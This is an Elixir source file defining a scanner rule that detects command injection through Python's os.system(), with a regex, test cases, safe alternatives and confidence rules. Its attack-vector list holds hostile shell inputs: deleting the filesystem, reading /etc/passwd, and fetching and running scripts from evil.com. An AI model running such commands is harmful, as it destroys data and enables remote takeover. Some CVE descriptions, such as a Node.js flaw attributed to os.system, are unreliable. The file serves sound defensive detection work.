defmodule RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem do
  @moduledoc """
  Command Injection via Python os.system()
  
  Detects dangerous patterns like:
    os.system("ls " + user_input)
    os.system(f"ping {host}")
    os.system("echo %s" % message)
    
  Safe alternatives:
    subprocess.run(["ls", user_input], shell=False)
    subprocess.call(["ping", "-c", "4", host])
    import shlex; subprocess.run(shlex.split(f"ls {shlex.quote(user_input)}"))
    
  ## Vulnerability Details
  
  The os.system() function executes commands through the system shell, making it
  inherently dangerous when used with user input. Any user-controlled data passed
  to os.system() can lead to arbitrary command execution.
  
  The vulnerability occurs when:
  1. User input is concatenated or interpolated into command strings
  2. No input validation or sanitization is performed
  3. The resulting string is passed to os.system()
  4. The system shell interprets special characters and command separators
  
  This pattern is particularly dangerous because:
  - os.system() always uses the shell, enabling command chaining with ;, &&, ||
  - Shell metacharacters like $, `, \, ! are interpreted
  - It's a common pattern in legacy Python code
  - Developers often underestimate the security implications
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  alias RsolvApi.Security.Pattern
  
  @doc """
  Returns the command injection via os.system pattern.
  
  This pattern detects usage of os.system() with user-controlled input
  which can lead to arbitrary command execution.
  
  ## Examples
  
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> pattern.id
      "python-command-injection-os-system"
      
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> pattern.severity
      :critical
      
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> vulnerable = ~S|os.system("ls " + user_input)|
      iex> Regex.match?(pattern.regex, vulnerable)
      true
      
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> safe = ~S|subprocess.run(["ls", user_input], shell=False)|
      iex> Regex.match?(pattern.regex, safe)
      false
      
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> fstring_vuln = ~S|os.system(f"ping {host}")|
      iex> Regex.match?(pattern.regex, fstring_vuln)
      true
      
      iex> pattern = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.pattern()
      iex> hardcoded = ~S|os.system("clear")|
      iex> Regex.match?(pattern.regex, hardcoded)
      false
  """
  @impl true
  def pattern do
    %Pattern{
      id: "python-command-injection-os-system",
      name: "Command Injection via os.system",
      description: "Unsanitized input in os.system() can lead to command injection",
      type: :command_injection,
      severity: :critical,
      languages: ["python"],
      regex: ~r/
        # Direct os.system call with dynamic strings
        os\.system\s*\(\s*[^)]*(?:
          \+|                    # String concatenation
          %\s|                   # % formatting
          \.format|              # .format() method
          f["']                  # f-string
        )|
        # Variable assignment followed by os.system
        (?:cmd|command|exec_str)\s*=.*(?:\+|%\s|\.format|f["']).*os\.system
      /x,
      default_tier: :ai,
      cwe_id: "CWE-78",
      owasp_category: "A03:2021",
      recommendation: "Use subprocess.run() with shell=False and pass arguments as a list",
      test_cases: %{
        vulnerable: [
          ~S|os.system("ls " + user_input)|,
          ~S|os.system(f"ping {host}")|,
          ~S|os.system("echo %s" % message)|,
          ~S|os.system("cat {}".format(filename))|
        ],
        safe: [
          ~S|subprocess.run(["ls", user_input], shell=False)|,
          ~S|subprocess.call(["ping", "-c", "4", host])|,
          ~S|os.system("ls -la")|,
          ~S|# os.system is dangerous with user input|
        ]
      }
    }
  end
  
  @impl true
  def vulnerability_metadata do
    %{
      description: """
      Command injection vulnerability through Python's os.system() function.
      This function passes commands directly to the system shell, interpreting
      shell metacharacters and allowing command chaining. When user input is
      incorporated into os.system() calls, attackers can execute arbitrary commands.
      
      The vulnerability is severe because:
      - os.system() always invokes the shell (sh on Unix, cmd.exe on Windows)
      - No escaping is performed on the command string
      - Shell features like pipes, redirects, and command separators are active
      - It's a common pattern in older Python code and quick scripts
      - The function provides no protection against malicious input
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-78",
          title: "Improper Neutralization of Special Elements used in an OS Command",
          url: "https://cwe.mitre.org/data/definitions/78.html"
        },
        %{
          type: :owasp,
          id: "A03:2021",
          title: "OWASP Top 10 2021 - A03 Injection",
          url: "https://owasp.org/Top10/A03_2021-Injection/"
        },
        %{
          type: :research,
          id: "python_command_injection",
          title: "Command injection prevention for Python",
          url: "https://semgrep.dev/docs/cheat-sheets/python-command-injection"
        },
        %{
          type: :research,
          id: "secureflag_os_injection",
          title: "OS Command Injection in Python",
          url: "https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_python.html"
        }
      ],
      attack_vectors: [
        "Command chaining: user_input = 'file.txt; rm -rf /'",
        "Command substitution: user_input = '$(cat /etc/passwd)'",
        "Pipe injection: user_input = 'file.txt | mail attacker@evil.com'",
        "Background execution: user_input = 'file.txt & wget evil.com/backdoor.sh'",
        "Output redirection: user_input = 'file.txt > /etc/hosts'",
        "Backtick execution: user_input = '`curl evil.com/script.sh | sh`'"
      ],
      real_world_impact: [
        "Remote code execution with application privileges",
        "Complete system compromise through reverse shells",
        "Data exfiltration via command output or network tools",
        "Denial of service by killing processes or consuming resources",
        "Privilege escalation if application runs with elevated permissions",
        "Lateral movement to other systems via SSH or network commands"
      ],
      cve_examples: [
        %{
          id: "CVE-2021-21315",
          description: "Command injection in System Information Library for Node.js via os.system",
          severity: "critical",
          cvss: 9.8,
          note: "Unvalidated input passed to os.system() allowing arbitrary command execution"
        },
        %{
          id: "CVE-2024-20399",
          description: "Cisco command injection via Python script using os.system",
          severity: "critical",
          cvss: 10.0,
          note: "Authentication bypass and command injection through os.system"
        },
        %{
          id: "CVE-2016-3714",
          description: "ImageTragick - ImageMagick command injection affecting Python wrappers",
          severity: "critical",
          cvss: 10.0,
          note: "Image processing libraries using os.system for conversions"
        }
      ],
      detection_notes: """
      The pattern detects:
      1. Direct calls to os.system() function
      2. String concatenation with + operator
      3. String formatting with %, .format(), or f-strings
      4. Any dynamic string construction passed to os.system()
      
      Key indicators:
      - The os.system function call
      - Dynamic string construction methods
      - Variables or expressions in the command string
      """,
      safe_alternatives: [
        "Use subprocess.run(['command', 'arg1', 'arg2'], shell=False)",
        "Use subprocess.call() with argument list instead of string",
        "For shell features, use subprocess.run() with proper argument escaping",
        "Use shlex.split() to safely parse command strings",
        "Use shlex.quote() to escape individual arguments if needed",
        "Consider using specialized libraries for specific tasks (e.g., paramiko for SSH)"
      ],
      additional_context: %{
        common_mistakes: [
          "Thinking that input validation alone is sufficient",
          "Believing that removing spaces prevents command injection",
          "Using os.system() for convenience without considering security",
          "Assuming that numeric inputs are safe",
          "Not realizing that os.system() always uses the shell"
        ],
        secure_patterns: [
          "Always use subprocess with shell=False when possible",
          "Pass commands as lists, not concatenated strings",
          "Validate input against an allowlist of safe values",
          "Use Python libraries instead of shell commands when available",
          "Apply the principle of least privilege to the process"
        ]
      }
    }
  end
  
  @doc """
  Returns AST enhancement rules to reduce false positives.
  
  This enhancement helps distinguish between actual command injection vulnerabilities
  and legitimate uses of os.system() with hardcoded commands.
  
  ## Examples
  
      iex> enhancement = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = RsolvApi.Security.Patterns.Python.CommandInjectionOsSystem.ast_enhancement()
      iex> enhancement.min_confidence
      0.8
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "Call",
        module: "os",
        function: "system",
        argument_analysis: %{
          check_string_construction: true,
          detect_user_input: true,
          analyze_format_strings: true
        }
      },
      context_rules: %{
        dangerous_patterns: ["request.", "input(", "argv", "environ", "getenv"],
        exclude_if_literal: true,
        exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/, ~r/migrations/],
        check_input_validation: true,
        safe_if_hardcoded: true
      },
      confidence_rules: %{
        base: 0.6,
        adjustments: %{
          "has_user_input" => 0.3,
          "uses_string_formatting" => 0.2,
          "in_web_context" => 0.2,
          "in_test_code" => -1.0,
          "is_hardcoded_command" => -0.8,
          "has_input_validation" => -0.3,
          "in_utility_script" => -0.2
        }
      },
      min_confidence: 0.8
    }
  end
end